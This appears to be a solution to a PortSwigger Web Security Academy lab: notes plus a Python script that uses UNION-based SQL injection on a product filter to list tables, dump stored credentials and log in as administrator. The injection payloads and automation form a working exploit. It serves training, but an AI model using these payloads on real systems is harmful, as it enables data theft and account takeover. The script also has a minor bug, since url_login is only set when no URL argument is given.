'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

1. Vulnerability:  Product Category FIlter (SQLi)

2. Goal: 1. Determine the Table that contains User Info
         2. Determine the columns of the relevant table
         3. Output the contents of the Table
         4. Login as Administrator user (Final Goal)

3 Analysis: 1. Find The Number of Columns (' ORDER BY 1--)
                - 2 columns (Error in 'ORDER BY 3--)
            2. Find the Data Types of the Columns (' UNION SELECT 'a', 'a'--)
                - Both Columns Accept Data type TEXT
            3. Version of the Database
                - Microsoft 	SELECT @@version    -> (' UNION SELECT @@version, NULL--) #Not Microsoft
                - PostgreSQL 	SELECT version()    -> (' UNION SELECT version(), NULL--) #200 OK , Its a PostgreSQL Database
                - MySQL 	SELECT @@version        -> (' UNION SELECT @@version, NULL--) #Not MySQL
            4. Output the list of Table 
                - PostgreSQL 	SELECT * FROM information_schema.tables
                (' UNION SELECT table_name, NULL FROM information_schema.tables--)
                    users_ctknsh
            5. Output the list of columns of our users_<random> Table
                PostgreSQL  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
                (' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'--)
)               ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ctknsh'--               
                    username_rrtooz, password_dabmje
            6. Output the Usernames and Passwords
                (' UNION SELECT username_<random>, password_<random> from users_<random>--)
                ' UNION SELECT username_rrtooz, password_dabmje from users_ctknsh--
                    wiener, ky6gllarwjgko4m62sw6
                    administrator, 1k0y3kzw6r03b9lqeyu3

4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-09/sqli-lab-09.py

'''


import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path='/filter?category=Gifts'
    try: 
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + path + sql_payload, verify=False)
    return r.text
    
def get_csrf_token(s, url):
    try:
        r = s.get(url, verify=False, proxies=proxies)
    except: 
        r = s.get(url, verify=False)

    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(s, url_login, admin_password):
    csrf = get_csrf_token(s, url_login)
    data = {"csrf": csrf,
            "username": "administrator",
            "password": admin_password}
    try:
        r = s.post(url_login, data=data, verify=False, proxies=proxies)
    except:
        r = s.post(url_login, data=data, verify=False)

    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" %(username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
    return admin_password

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*username.*'))
    password_column = soup.find(string=re.compile('.*password.*'))
    return username_column, password_column



def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res,'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        
        # Optional filling Manually
        url = 'https://0ad100ef045d44e98062e9f6006e0034.web-security-academy.net'
        url_login= url + "/login"
    s=requests.Session()

    print("Looking for Users Table...")

    #Step 5
    users_table = sqli_users_table(url)
    if users_table:
        print('Found the users table name: %s'%users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print('Found the username column: %s'%username_column)
            print('Found the password column: %s'%password_column)
            
            #Step 6
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            
            #Logging in as Administrator
                if exploit_sqli(s, url_login, admin_password):
                    print("[+] SQL injection successful!, Logged In as Administrator :)")
                else:
                    print("[-] SQL injection unsuccessful!")
            else:
                print("[-] Did not find the administrator password.")
        else:
            print("Not able to Find users Table")
    else:
        print("Not able to Find users Table")
